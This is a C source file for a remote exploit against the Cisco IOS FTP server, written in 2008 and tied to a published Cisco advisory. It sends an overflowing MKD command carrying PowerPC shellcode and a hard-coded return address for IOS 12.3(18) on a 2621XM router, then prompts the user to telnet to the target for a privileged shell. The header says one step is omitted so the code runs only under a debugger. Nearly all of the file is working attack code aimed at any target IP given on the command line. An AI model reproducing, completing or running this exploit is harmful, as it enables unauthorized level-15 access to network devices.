/*

 Cisco IOS FTP server remote exploit by Andy Davis 2008               
                                                                      
 Cisco Advisory ID: cisco-sa-20070509-iosftp - May 2007               
                                                                      
 Specific hard-coded addresses for IOS 12.3(18) on a 2621XM router    
                                                                      
 Removes the requirement to authenticate and escalates to level 15    
                                                                      
 *********************************************************************
 To protect the innocent a critical step has been omitted, which means
 the shellcode will only execute when the router is attached to gdb.  
 I'm sure the PowerPC shellcoders out there will work it out...       
 *********************************************************************
                                                                      
 Thanks to Gyan Chawdhary and Varun Uppal for all the hours they spent
 on the original IOS security research                                
                                                                      
 iosftpexploit <at> googlemail 'dot' com                              

*/

#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>

#define PORT 21

int main(int argc, char **argv)
{
unsigned char sendbuf[] =

"MKD "

/* .equ vty_info, 0x8182da60    # pointer to VTY info */
/* .equ terminate, 0x80e4086c   # kill a process */

"\x3c\x80\x81\x83"      /* lis     4,vty_info@ha */
"\x38\x84\xda\x60"      /* la      4,vty_info@l(4) */
"\x7d\x08\x42\x78"      /* xor     8,8,8 */
"\x7c\xe4\x40\x2e"      /* lwzx    7,4,8 */
"\x91\x07\x01\x74"      /* stw     8,372(7) */
"\x39\x08\xff\xff"      /* subi    8,8,1 */
"\x38\xe7\x09\x1a"      /* addi    7,7,233 */
"\x91\x07\x04\xca"      /* stw     8,1226(7) */
"\x7d\x03\x43\x78"      /* mr      3,8 */
"\x3c\x80\x80\xe4"      /* lis     4,terminate@ha */
"\x38\x84\x08\x6c"      /* la      4,terminate@l(4) */
"\x7c\x89\x03\xa6"      /* mtctr   4 */
"\x4e\x80\x04\x20"      /* bctr    */

/* exists cleanly without adversely affecting the FTP server */

"\x61\x61\x61\x61"      /* padding */
"\x61\x61\x61\x61"      /* padding */
"\x61\x61\x61\x61"      /* padding */
"\x61\x61\x61\x61"      /* padding */
"\x61\x61\x61\x61"      /* padding */
"\x61\x61\x61\x61"      /* padding */

"\x80\x06\x23\xB8"      /* return address */
"\x0d\x0a";

/* trampoline code */
/* when the overflow occurs r26+0x14 points to the shellcode */
/*
0x800623B8      lwz     26, 20(26)
0x800623BC      mtctr   26
0x800623C0      mr      3, 27
0x800623C4      bctrl
*/

unsigned char recvbuf[256];
struct sockaddr_in servaddr;
int s;

if (argc != 2)
        {
        printf ("\nCisco IOS FTP server remote exploit by Andy Davis 2008\n");

        printf ("\nUsage: %s <target IP address>\n",argv[0]);
        exit(-1);
        }

servaddr.sin_family = AF_INET;
servaddr.sin_addr.s_addr = inet_addr(argv[1]);
servaddr.sin_port = htons(PORT);

s = socket(AF_INET, SOCK_STREAM, 0);
connect (s, (struct sockaddr *) &servaddr, sizeof(servaddr));
printf ("\nCisco IOS FTP server remote exploit by Andy Davis 2008\n");
printf ("Specific offsets for IOS 12.3(18) on a 2621XM router\n\n");
printf ("Sending exploit...\n\n");

if (send(s, sendbuf, sizeof(sendbuf)-1, 0) == 0)
        {
        printf("Error sending packet...quitting\n\n");
        exit (1);
        }
recv (s, recvbuf, sizeof(recvbuf)-1,0);
printf ("Now telnet to the router for a shell...\n\n");
}



